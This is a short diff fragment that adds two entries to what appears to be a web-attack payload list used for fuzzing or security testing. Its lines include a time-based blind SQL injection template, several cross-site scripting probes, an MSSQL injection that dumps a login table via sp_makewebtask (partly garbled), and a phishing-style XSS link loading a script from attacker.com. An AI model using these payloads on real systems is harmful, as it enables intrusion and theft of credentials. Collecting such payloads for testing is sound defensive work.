@@ -10,3 +10,5 @@ bar
 'OR IF((ASCII(MID(({INJECTON}),1,1)) = 100),SLEEP(14),1) = 0 LIMIT 1--
 <script>alert('foo')</script>
 >'>"><img src=x onerror=alert(0)>.
+' Union EXEC master..sp_makewebtask eProcessing (true); ocessing (false);"C:\\ users.html", select * from tlogin; --
+<a href="http://www.xyzbank.com/findATM?zip=<script%20src=’http://www.attacker.com/malicious_script.js’></script>">here</a>
